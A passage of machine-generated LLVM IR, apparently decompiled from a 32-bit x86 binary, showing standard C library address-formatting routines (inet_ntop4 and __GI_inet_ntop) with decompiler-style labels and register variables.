  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_8053f4c = add i32 %v0_8053efe, 2
  store i32 %v1_8053f4c, i32* @ecx, align 4
  %v1_8053f51 = trunc i16 %tmp44 to i8
  %v2_8053f51 = or i8 %v1_8053f51, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_8053f51 = zext i8 %v2_8053f51 to i32
  store i32 %v12_8053f51, i32* %eax.global-to-local, align 4
  %v4_8053f53 = add i32 %v0_8053efe, 44
  %v5_8053f53 = add i32 %v4_8053f53, %v0_8053f07
  %v6_8053f53 = inttoptr i32 %v5_8053f53 to i8*
  store i8 %v2_8053f51, i8* %v6_8053f53, align 1
  br label %dec_label_pc_8053f57

dec_label_pc_8053f57:                             ; preds = %dec_label_pc_8053f0e, %dec_label_pc_8053f2e, %dec_label_pc_8053f34
  %v0_8053f57 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053f57 = inttoptr i32 %v0_8053f57 to i8*
  %v2_8053f57 = load i8, i8* %v1_8053f57, align 1
  %v3_8053f57 = zext i8 %v2_8053f57 to i32
  store i32 %v3_8053f57, i32* %eax.global-to-local, align 4
  %v0_8053f60 = load i32, i32* @esi, align 4
  %v1_8053f60 = add i32 %v0_8053f60, 1
  store i32 %v1_8053f60, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8053f65 = load i32, i32* @esp, align 4
  %v1_8053f65 = load i32, i32* @ecx, align 4
  %v2_8053f65 = add i32 %v0_8053f65, 44
  %v3_8053f65 = add i32 %v2_8053f65, %v1_8053f65
  %v4_8053f65 = inttoptr i32 %v3_8053f65 to i8*
  store i8 46, i8* %v4_8053f65, align 1
  %v0_8053f6a = load i32, i32* @ecx, align 4
  %v1_8053f6a = add i32 %v0_8053f6a, 2
  store i32 %v1_8053f6a, i32* %edi.global-to-local, align 4
  %v0_8053f6d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f6d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053f6d = zext i32 %v1_8053f6d to i64
  %v3_8053f6d = load i32, i32* %edx.global-to-local, align 4
  %v4_8053f6d = zext i32 %v3_8053f6d to i64
  %v5_8053f6d = mul nuw i64 %v4_8053f6d, 4294967296
  %v6_8053f6d = or i64 %v5_8053f6d, %v2_8053f6d
  %v7_8053f6d = zext i32 %v0_8053f6d to i64
  %v8_8053f6d = udiv i64 %v6_8053f6d, %v7_8053f6d
  %v9_8053f6d = trunc i64 %v8_8053f6d to i32
  %v10_8053f6d = urem i64 %v6_8053f6d, %v7_8053f6d
  %v11_8053f6d = trunc i64 %v10_8053f6d to i32
  store i32 %v11_8053f6d, i32* @edx, align 4
  %v3_8053f6f = and i32 %v9_8053f6d, -256
  %v1_8053f71 = trunc i64 %v10_8053f6d to i8
  %v2_8053f71 = add i8 %v1_8053f71, 48
  %v12_8053f71 = zext i8 %v2_8053f71 to i32
  %v15_8053f71 = or i32 %v12_8053f71, %v3_8053f6f
  store i32 %v15_8053f71, i32* %eax.global-to-local, align 4
  %v2_8053f73 = load i32, i32* @esp, align 4
  %v4_8053f73 = add i32 %v0_8053f6a, 43
  %v5_8053f73 = add i32 %v4_8053f73, %v2_8053f73
  %v6_8053f73 = inttoptr i32 %v5_8053f73 to i8*
  store i8 %v2_8053f71, i8* %v6_8053f73, align 1
  %v0_8053f77 = load i32, i32* @esi, align 4
  %v10_8053f77 = icmp eq i32 %v0_8053f77, 3
  store i1 %v10_8053f77, i1* %zf.global-to-local, align 1
  %v7_8053f7a = icmp sgt i32 %v0_8053f77, 3
  %v1_8053f80.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8053f7a, label %dec_label_pc_8053f80, label %dec_label_pc_8053ee4

dec_label_pc_8053f80:                             ; preds = %dec_label_pc_8053f57, %entry
  %v1_8053f80 = phi i32 [ 0, %entry ], [ %v1_8053f80.pre, %dec_label_pc_8053f57 ]
  %v0_8053f80 = load i32, i32* @esp, align 4
  %v2_8053f80 = add i32 %v0_8053f80, 42
  %v3_8053f80 = add i32 %v2_8053f80, %v1_8053f80
  %v4_8053f80 = inttoptr i32 %v3_8053f80 to i8*
  store i8 0, i8* %v4_8053f80, align 1
  %v0_8053f85 = load i32, i32* @esp, align 4
  %v9_8053f85 = icmp eq i32 %v0_8053f85, 12
  store i1 %v9_8053f85, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_8053f8d = call i32 @strlen(i8* %tmp27)
  store i32 %v3_8053f8d, i32* @eax, align 4
  %v15_8053f95 = icmp eq i32 %v3_8053f8d, %v0_8053ecc
  store i1 %v15_8053f95, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_8053f8d, %v0_8053ecc
  br i1 %tmp45, label %dec_label_pc_8053f9b, label %dec_label_pc_8053faa

dec_label_pc_8053f9b:                             ; preds = %dec_label_pc_8053f80
  %v0_8053f9b = load i8*, i8** %stack_var_-92, align 4
  %v1_8053f9b = ptrtoint i8* %v0_8053f9b to i32
  %v2_8053f9b = call i32 @__errno_location(i32 %v1_8053f9b)
  %v1_8053fa0 = inttoptr i32 %v2_8053f9b to i32*
  store i32 28, i32* %v1_8053fa0, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053fb9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053fb9

dec_label_pc_8053faa:                             ; preds = %dec_label_pc_8053f80
  %v2_8053f88 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_8053fad4 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_8053fad4, i32* %tmp29, align 4
  %v0_8053fb1.cast = inttoptr i32 %v3_8053fad4 to i8*
  %v4_8053fb1 = call i32 @strcpy(i8* %v0_8053fb1.cast, i32 %v2_8053f88)
  store i32 %v4_8053fb1, i32* %eax.global-to-local, align 4
  %v0_8053fb6 = load i32, i32* @esp, align 4
  %v6_8053fb6 = icmp eq i32 %v0_8053fb6, -16
  store i1 %v6_8053fb6, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8053fb9

dec_label_pc_8053fb9:                             ; preds = %dec_label_pc_8053f9b, %dec_label_pc_8053faa
  %v0_8053fc0 = phi i32 [ 0, %dec_label_pc_8053f9b ], [ %v4_8053fb1, %dec_label_pc_8053faa ]
  %v0_8053fb9 = phi i32 [ %v0_8053fb9.pre, %dec_label_pc_8053f9b ], [ %v15_8053eb6, %dec_label_pc_8053faa ]
  %v9_8053fb9 = icmp eq i32 %v0_8053fb9, -60
  store i1 %v9_8053fb9, i1* %zf.global-to-local, align 1
  store i32 %v0_8053eb2, i32* @esi, align 4
  store i32 %v0_8053eb1, i32* @edi, align 4
  ret i32 %v0_8053fc0

; uselistorder directives
  uselistorder i32 %v0_8053f77, { 2, 0, 1 }
  uselistorder i8 %v2_8053f51, { 1, 0 }
  uselistorder i32 %v0_8053f36, { 1, 0 }
  uselistorder i1 %v11_8053f07, { 1, 0 }
  uselistorder i32 %v1_8053efe, { 1, 0 }
  uselistorder i32 %v5_8053eec, { 1, 0 }
  uselistorder i32 %v0_8053f7730, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 23, 24, 25, 14, 16, 17, 13, 15, 8, 18, 12, 19, 20, 21, 22, 26, 36, 37, 9, 31, 27, 10, 28, 29, 30, 32, 33, 11, 34, 35, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 2, 3, 4, 0, 1 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 2, 3, 0, 1 }
  uselistorder i1* @df, { 4, 28, 29, 0, 1, 30, 31, 32, 11, 2, 3, 40, 41, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053fb9, { 1, 0 }
  uselistorder label %dec_label_pc_8053f57, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_8053fc2 = load i32, i32* @edi, align 4
  %v0_8053fc3 = load i32, i32* @esi, align 4
  %v0_8053fc4 = load i32, i32* @ebx, align 4
  %v15_8053fc5 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_8053fcc = icmp eq i32 %arg1, 2
  br i1 %v9_8053fcc, label %dec_label_pc_8053fdc, label %dec_label_pc_8053fd1

dec_label_pc_8053fd1:                             ; preds = %entry
  %v9_8053fd1 = icmp eq i32 %arg1, 10
  %v1_8053fd4 = icmp eq i1 %v9_8053fd1, false
  br i1 %v1_8053fd4, label %dec_label_pc_805417b, label %dec_label_pc_8053ff4

dec_label_pc_8053fdc:                             ; preds = %entry
  %v4_8053fdc = ptrtoint i8* %arg3 to i32
  store i32 %v4_8053fdc, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8053fe8 = call i32 @inet_ntop4(i32 %v0_8053fc4, i32 %v0_8053fc3, i32 %v0_8053fc2)
  store i32 %v3_8053fe8, i32* %eax.global-to-local, align 4
  store i32 %v3_8053fe8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054188

dec_label_pc_8053ff4:                             ; preds = %dec_label_pc_8053fd1
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8053ff9 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8053ff9, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8053ffe = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8053ffe, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8054020 = add i32 %arg2, 1
  br label %dec_label_pc_805400a

dec_label_pc_805400a:                             ; preds = %dec_label_pc_805400a.dec_label_pc_805400a_crit_edge, %dec_label_pc_8053ff4
  %v1_805402d = phi i32 [ %v15_8053fc5, %dec_label_pc_8053ff4 ], [ %v1_805402d.pre, %dec_label_pc_805400a.dec_label_pc_805400a_crit_edge ]
  %v0_805402570 = phi i32 [ 0, %dec_label_pc_8053ff4 ], [ %v0_8054031.pre, %dec_label_pc_805400a.dec_label_pc_805400a_crit_edge ]
  %v1_8054013 = ashr i32 %v0_805402570, 31
  %v2_8054014 = zext i32 %v0_805402570 to i64
  %v4_8054014 = zext i32 %v1_8054013 to i64
  %v5_8054014 = mul nuw i64 %v4_8054014, 4294967296
  %v6_8054014 = or i64 %v5_8054014, %v2_8054014
  %v8_8054014 = sdiv i64 %v6_8054014, 2
  %v9_8054014 = trunc i64 %v8_8054014 to i32
  store i32 %v9_8054014, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8054014, i32* %ebx.global-to-local, align 4
  %v2_805401c = add i32 %v0_805402570, %arg2
  %v3_805401c = inttoptr i32 %v2_805401c to i8*
  %v4_805401c = load i8, i8* %v3_805401c, align 1
  %v5_805401c = zext i8 %v4_805401c to i32
  store i32 %v5_805401c, i32* %eax.global-to-local, align 4
  %v3_8054020 = add i32 %v2_8054020, %v0_805402570
  %v4_8054020 = inttoptr i32 %v3_8054020 to i8*
  %v5_8054020 = load i8, i8* %v4_8054020, align 1
  %v6_8054020 = zext i8 %v5_8054020 to i32
  store i32 %v6_8054020, i32* %edx.global-to-local, align 4
  %v1_8054025 = add i32 %v0_805402570, 2
  store i32 %v1_8054025, i32* %ecx.global-to-local, align 4
  %v2_8054028 = mul nuw nsw i32 %v5_805401c, 256
  %v2_805402b = or i32 %v6_8054020, %v2_8054028
  store i32 %v2_805402b, i32* %eax.global-to-local, align 4
  %v3_805402d = mul i32 %v9_8054014, 4
  %v4_805402d = add i32 %v3_805402d, 60
  %v5_805402d = add i32 %v4_805402d, %v1_805402d
  %v6_805402d = inttoptr i32 %v5_805402d to i32*
  store i32 %v2_805402b, i32* %v6_805402d, align 4
  %v0_8054031.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8054034 = icmp sgt i32 %v0_8054031.pre, 15
  br i1 %v7_8054034, label %dec_label_pc_8054036, label %dec_label_pc_805400a.dec_label_pc_805400a_crit_edge

dec_label_pc_805400a.dec_label_pc_805400a_crit_edge: ; preds = %dec_label_pc_805400a
  %v1_805402d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805400a

dec_label_pc_8054036:                             ; preds = %dec_label_pc_805400a
  %v4_8053ff4 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054040.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054040

dec_label_pc_8054040:                             ; preds = %dec_label_pc_8054036, %dec_label_pc_805406d
  %v0_805406d69 = phi i32 [ 0, %dec_label_pc_8054036 ], [ %v1_805406d, %dec_label_pc_805406d ]
  %v0_805405868 = phi i32 [ -1, %dec_label_pc_8054036 ], [ %v0_80540588, %dec_label_pc_805406d ]
  %v0_805407867 = phi i32 [ -1, %dec_label_pc_8054036 ], [ %v0_805405d9, %dec_label_pc_805406d ]
  %v0_805408366 = phi i32 [ -1, %dec_label_pc_8054036 ], [ %v0_805406813, %dec_label_pc_805406d ]
  %v2_8054040 = mul nuw nsw i32 %v0_805406d69, 4
  %v3_8054040 = add nuw nsw i32 %v2_8054040, 60
  %v4_8054040 = add i32 %v3_8054040, %v0_8054040.pre
  %v5_8054040 = inttoptr i32 %v4_8054040 to i32*
  %v6_8054040 = load i32, i32* %v5_8054040, align 4
  %v7_8054040 = icmp eq i32 %v6_8054040, 0
  %v1_8054045 = icmp eq i1 %v7_8054040, false
  %v10_8054058 = icmp eq i32 %v0_805405868, -1
  br i1 %v1_8054045, label %dec_label_pc_8054058, label %dec_label_pc_8054047

dec_label_pc_8054047:                             ; preds = %dec_label_pc_8054040
  %v1_805404a = icmp eq i1 %v10_8054058, false
  br i1 %v1_805404a, label %dec_label_pc_8054055, label %dec_label_pc_805404c

dec_label_pc_805404c:                             ; preds = %dec_label_pc_8054047
  store i32 %v0_805406d69, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805406d

dec_label_pc_8054055:                             ; preds = %dec_label_pc_8054047
  %v0_8054055 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054055 = add i32 %v0_8054055, 1
  store i32 %v1_8054055, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805406d

dec_label_pc_8054058:                             ; preds = %dec_label_pc_8054040
  br i1 %v10_8054058, label %dec_label_pc_805406d, label %dec_label_pc_805405d

dec_label_pc_805405d:                             ; preds = %dec_label_pc_8054058
  %v10_805405d = icmp eq i32 %v0_805407867, -1
  %v0_8054066.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054062 = load i32, i32* @ebp, align 4
  %v7_8054064 = icmp sgt i32 %v0_8054066.pre, %v1_8054062
  %or.cond = or i1 %v10_805405d, %v7_8054064
  br i1 %or.cond, label %dec_label_pc_8054066, label %dec_label_pc_805406a

dec_label_pc_8054066:                             ; preds = %dec_label_pc_805405d
  store i32 %v0_8054066.pre, i32* @ebp, align 4
  store i32 %v0_805408366, i32* @edi, align 4
  br label %dec_label_pc_805406a

dec_label_pc_805406a:                             ; preds = %dec_label_pc_805405d, %dec_label_pc_8054066
  %v0_805405d11 = phi i32 [ %v0_805408366, %dec_label_pc_8054066 ], [ %v0_805407867, %dec_label_pc_805405d ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805406d

dec_label_pc_805406d:                             ; preds = %dec_label_pc_8054058, %dec_label_pc_8054055, %dec_label_pc_805404c, %dec_label_pc_805406a
  %v0_805406813 = phi i32 [ %v0_805408366, %dec_label_pc_8054058 ], [ %v0_805408366, %dec_label_pc_8054055 ], [ %v0_805406d69, %dec_label_pc_805404c ], [ -1, %dec_label_pc_805406a ]
  %v0_80540588 = phi i32 [ -1, %dec_label_pc_8054058 ], [ %v0_805405868, %dec_label_pc_8054055 ], [ %v0_805406d69, %dec_label_pc_805404c ], [ -1, %dec_label_pc_805406a ]
  %v0_805405d9 = phi i32 [ %v0_805407867, %dec_label_pc_8054058 ], [ %v0_805407867, %dec_label_pc_8054055 ], [ %v0_805407867, %dec_label_pc_805404c ], [ %v0_805405d11, %dec_label_pc_805406a ]
  %v1_805406d = add nuw nsw i32 %v0_805406d69, 1
  store i32 %v1_805406d, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_805406d, 8
  br i1 %exitcond, label %dec_label_pc_8054073, label %dec_label_pc_8054040

dec_label_pc_8054073:                             ; preds = %dec_label_pc_805406d
  %v10_8054073 = icmp eq i32 %v0_805406813, -1
  br i1 %v10_8054073, label %dec_label_pc_8054085, label %dec_label_pc_8054078

dec_label_pc_8054078:                             ; preds = %dec_label_pc_8054073
  %v10_8054078 = icmp eq i32 %v0_805405d9, -1
  %v0_8054081.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8054078, label %dec_label_pc_8054081, label %dec_label_pc_805407d

dec_label_pc_805407d:                             ; preds = %dec_label_pc_8054078
  %v1_805407d = load i32, i32* @ebp, align 4
  %v7_805407f = icmp sgt i32 %v0_8054081.pre, %v1_805407d
  br i1 %v7_805407f, label %dec_label_pc_8054081, label %dec_label_pc_8054085

dec_label_pc_8054081:                             ; preds = %dec_label_pc_8054078, %dec_label_pc_805407d
  store i32 %v0_8054081.pre, i32* @ebp, align 4
  store i32 %v0_805406813, i32* @edi, align 4
  br label %dec_label_pc_8054085

dec_label_pc_8054085:                             ; preds = %dec_label_pc_805407d, %dec_label_pc_8054073, %dec_label_pc_8054081
  %v5_8054092 = phi i32 [ %v0_805405d9, %dec_label_pc_805407d ], [ %v0_805405d9, %dec_label_pc_8054073 ], [ %v0_805406813, %dec_label_pc_8054081 ]
  %v10_8054085 = icmp eq i32 %v5_8054092, -1
  br i1 %v10_8054085, label %dec_label_pc_8054095, label %dec_label_pc_805408a

dec_label_pc_805408a:                             ; preds = %dec_label_pc_8054085
  %v0_805408a = load i32, i32* @ebp, align 4
  %v1_805408a = add i32 %v0_805408a, -1
  %v6_805408a = sub i32 0, %v0_805408a
  %v7_805408a = and i32 %v0_805408a, %v6_805408a
  %v8_805408a = icmp slt i32 %v7_805408a, 0
  %v9_805408a = icmp eq i32 %v1_805408a, 0
  %v10_805408a = icmp slt i32 %v1_805408a, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8054092 = icmp ne i1 %v10_805408a, %v8_805408a
  %v4_8054092 = or i1 %v9_805408a, %v3_8054092
  %v7_8054092 = select i1 %v4_8054092, i32 -1, i32 %v5_8054092
  store i32 %v7_8054092, i32* @edi, align 4
  br label %dec_label_pc_8054095

dec_label_pc_8054095:                             ; preds = %dec_label_pc_8054085, %dec_label_pc_805408a
  %v0_805413518 = phi i32 [ %v5_8054092, %dec_label_pc_8054085 ], [ %v7_8054092, %dec_label_pc_805408a ]
  %v2_8054095 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8054095, i32* @ebx, align 4
  %v3_8054117 = add i32 %v4_8053ff4, 64
  %v12_80540d5 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805413558 = icmp eq i32 %v0_805413518, -1
  %v1_80540dd = icmp eq i1 %v12_80540d5, false
  br label %dec_label_pc_80540a0

dec_label_pc_80540a0:                             ; preds = %dec_label_pc_8054095, %dec_label_pc_805412b
  %v10_805413565 = phi i1 [ %v10_805413558, %dec_label_pc_8054095 ], [ %v10_8054135, %dec_label_pc_805412b ]
  %v0_80540ba64 = phi i32 [ 0, %dec_label_pc_8054095 ], [ %v1_805412b, %dec_label_pc_805412b ]
  %v1_80540b063 = phi i32 [ %v0_805413518, %dec_label_pc_8054095 ], [ %v0_8054135.pre, %dec_label_pc_805412b ]
  %v0_80540be62 = phi i32 [ %v2_8054095, %dec_label_pc_8054095 ], [ %v0_80540b419, %dec_label_pc_805412b ]
  %stack_var_-120.161 = phi i8* [ null, %dec_label_pc_8054095 ], [ %stack_var_-120.0, %dec_label_pc_805412b ]
  %stack_var_-116.160 = phi i32 [ 32, %dec_label_pc_8054095 ], [ %stack_var_-116.0, %dec_label_pc_805412b ]
  br i1 %v10_805413565, label %dec_label_pc_80540ba, label %dec_label_pc_80540a5

dec_label_pc_80540a5:                             ; preds = %dec_label_pc_80540a0
  %v2_80540a5 = sub i32 %v0_80540ba64, %v1_80540b063
  %v8_80540a5 = xor i32 %v0_80540ba64, %v1_80540b063
  %v9_80540a5 = xor i32 %v2_80540a5, %v0_80540ba64
  %v10_80540a5 = and i32 %v9_80540a5, %v8_80540a5
  %v11_80540a5 = icmp slt i32 %v10_80540a5, 0
  %v12_80540a5 = icmp eq i32 %v2_80540a5, 0
  %v13_80540a5 = icmp slt i32 %v2_80540a5, 0
  %v2_80540a7 = icmp eq i1 %v13_80540a5, %v11_80540a5
  br i1 %v2_80540a7, label %dec_label_pc_80540a9, label %dec_label_pc_80540ba

dec_label_pc_80540a9:                             ; preds = %dec_label_pc_80540a5
  %v1_80540a9 = load i32, i32* @ebp, align 4
  %v2_80540a9 = add i32 %v1_80540a9, %v1_80540b063
  store i32 %v2_80540a9, i32* %eax.global-to-local, align 4
  %v2_80540ac = sub i32 %v0_80540ba64, %v2_80540a9
  %v8_80540ac = xor i32 %v2_80540a9, %v0_80540ba64
  %v9_80540ac = xor i32 %v2_80540ac, %v0_80540ba64
  %v10_80540ac = and i32 %v9_80540ac, %v8_80540ac
  %v11_80540ac = icmp slt i32 %v10_80540ac, 0
  %v13_80540ac = icmp slt i32 %v2_80540ac, 0
  %v2_80540ae = icmp eq i1 %v13_80540ac, %v11_80540ac
  br i1 %v2_80540ae, label %dec_label_pc_80540ba, label %dec_label_pc_80540b0

dec_label_pc_80540b0:                             ; preds = %dec_label_pc_80540a9
  %v1_80540b2 = icmp eq i1 %v12_80540a5, false
  br i1 %v1_80540b2, label %dec_label_pc_805412b, label %dec_label_pc_80540b4

dec_label_pc_80540b4:                             ; preds = %dec_label_pc_80540b0
  %v1_80540b4 = inttoptr i32 %v0_80540be62 to i8*
  store i8 58, i8* %v1_80540b4, align 1
  %v0_80540b7 = load i32, i32* @ebx, align 4
  %v1_80540b7 = add i32 %v0_80540b7, 1
  store i32 %v1_80540b7, i32* @ebx, align 4
  br label %dec_label_pc_805412b

dec_label_pc_80540ba:                             ; preds = %dec_label_pc_80540a5, %dec_label_pc_80540a9, %dec_label_pc_80540a0
  %v1_80540ba = icmp eq i32 %v0_80540ba64, 0
  br i1 %v1_80540ba, label %dec_label_pc_80540c2, label %dec_label_pc_80540be

dec_label_pc_80540be:                             ; preds = %dec_label_pc_80540ba
  %v1_80540be = inttoptr i32 %v0_80540be62 to i8*
  store i8 58, i8* %v1_80540be, align 1
  %v0_80540c1 = load i32, i32* @ebx, align 4
  %v1_80540c1 = add i32 %v0_80540c1, 1
  store i32 %v1_80540c1, i32* @ebx, align 4
  %v0_80540c2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80540c2

dec_label_pc_80540c2:                             ; preds = %dec_label_pc_80540ba, %dec_label_pc_80540be
  %v0_8054120 = phi i32 [ %v0_80540be62, %dec_label_pc_80540ba ], [ %v1_80540c1, %dec_label_pc_80540be ]
  %v1_8054117 = phi i32 [ 0, %dec_label_pc_80540ba ], [ %v0_80540c2.pre, %dec_label_pc_80540be ]
  %v9_80540c2 = icmp eq i32 %v1_8054117, 6
  %v1_80540c5 = icmp eq i1 %v9_80540c2, false
  br i1 %v1_80540c5, label %dec_label_pc_8054116, label %dec_label_pc_80540c7

dec_label_pc_80540c7:                             ; preds = %dec_label_pc_80540c2
  %v0_80540c7 = load i32, i32* @edi, align 4
  %v1_80540c7 = icmp eq i32 %v0_80540c7, 0
  %v1_80540c9 = icmp eq i1 %v1_80540c7, false
  br i1 %v1_80540c9, label %dec_label_pc_8054116, label %dec_label_pc_80540cb

dec_label_pc_80540cb:                             ; preds = %dec_label_pc_80540c7
  %v0_80540cb = load i32, i32* @ebp, align 4
  %v9_80540cb = icmp eq i32 %v0_80540cb, 6
  br i1 %v9_80540cb, label %dec_label_pc_80540df, label %dec_label_pc_80540d0

dec_label_pc_80540d0:                             ; preds = %dec_label_pc_80540cb
  %v9_80540d0 = icmp eq i32 %v0_80540cb, 5
  %v1_80540d3 = icmp eq i1 %v9_80540d0, false
  br i1 %v1_80540d3, label %dec_label_pc_8054116, label %dec_label_pc_80540d5

dec_label_pc_80540d5:                             ; preds = %dec_label_pc_80540d0
  br i1 %v1_80540dd, label %dec_label_pc_8054116, label %dec_label_pc_80540df

dec_label_pc_80540df:                             ; preds = %dec_label_pc_80540d5, %dec_label_pc_80540cb
  %v2_80540e5 = sub i32 %v0_8054120, %v2_8054095
  store i32 %v2_80540e5, i32* @esi, align 4
  %v2_80540f0 = sub i32 46, %v2_80540e5
  store i32 %v2_80540f0, i32* @ecx, align 4
  store i32 %v0_8054120, i32* @edx, align 4
  %v1_80540f4 = add i32 %arg2, 12
  store i32 %v1_80540f4, i32* @eax, align 4
  %v0_80540f7 = load i8*, i8** %stack_var_-124, align 4
  %v1_80540f7 = ptrtoint i8* %v0_80540f7 to i32
  %v3_80540f7 = ptrtoint i8* %stack_var_-120.161 to i32
  %v5_80540f7 = call i32 @inet_ntop4(i32 %v1_80540f7, i32 %v3_80540f7, i32 %stack_var_-116.160)
  store i32 %v5_80540f7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80540fe = icmp eq i32 %v5_80540f7, 0
  br i1 %v1_80540fe, label %dec_label_pc_8054188, label %dec_label_pc_8054106

dec_label_pc_8054106:                             ; preds = %dec_label_pc_80540df
  %v0_8054109 = load i32, i32* @ebx, align 4
  %v5_8054109 = inttoptr i32 %v0_8054109 to i8*
  store i8* %v5_8054109, i8** %stack_var_-124, align 4
  %v3_805410a = call i32 @strlen(i8* %v5_8054109)
  store i32 %v3_805410a, i32* %eax.global-to-local, align 4
  %v0_8054112 = load i32, i32* @ebx, align 4
  %v3_8054112 = add i32 %v0_8054112, %v3_805410a
  store i32 %v3_8054112, i32* @ebx, align 4
  %v0_805413a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805413a

dec_label_pc_8054116:                             ; preds = %dec_label_pc_80540d5, %dec_label_pc_80540d0, %dec_label_pc_80540c7, %dec_label_pc_80540c2
  %v0_8054116 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8054116, i32* %stack_var_-112, align 4
  %v2_8054117 = mul i32 %v1_8054117, 4
  %v4_8054117 = add i32 %v3_8054117, %v2_8054117
  %v5_8054117 = inttoptr i32 %v4_8054117 to i32*
  %v6_8054117 = load i32, i32* %v5_8054117, align 4
  %v5_8054120 = inttoptr i32 %v0_8054120 to i8*
  store i8* %v5_8054120, i8** %stack_var_-124, align 4
  %v6_8054121 = call i32 @sprintf(i32 %v0_8054120, i32 ptrtoint ([3 x i8]* @global_var_8058631.257 to i32), i32 %v6_8054117, i32 %v0_8054116)
  store i32 %v6_8054121, i32* %eax.global-to-local, align 4
  %v0_8054129 = load i32, i32* @ebx, align 4
  %v2_8054129 = add i32 %v0_8054129, %v6_8054121
  store i32 %v2_8054129, i32* @ebx, align 4
  br label %dec_label_pc_805412b

dec_label_pc_805412b:                             ; preds = %dec_label_pc_80540b0, %dec_label_pc_80540b4, %dec_label_pc_8054116
  %stack_var_-116.0 = phi i32 [ %v6_8054117, %dec_label_pc_8054116 ], [ %stack_var_-116.160, %dec_label_pc_80540b0 ], [ %stack_var_-116.160, %dec_label_pc_80540b4 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058631.257, i32 0, i32 0), %dec_label_pc_8054116 ], [ %stack_var_-120.161, %dec_label_pc_80540b0 ], [ %stack_var_-120.161, %dec_label_pc_80540b4 ]
  %v0_80540b419 = phi i32 [ %v2_8054129, %dec_label_pc_8054116 ], [ %v0_80540be62, %dec_label_pc_80540b0 ], [ %v1_80540b7, %dec_label_pc_80540b4 ]
  %v0_805412b = load i32, i32* @esi, align 4
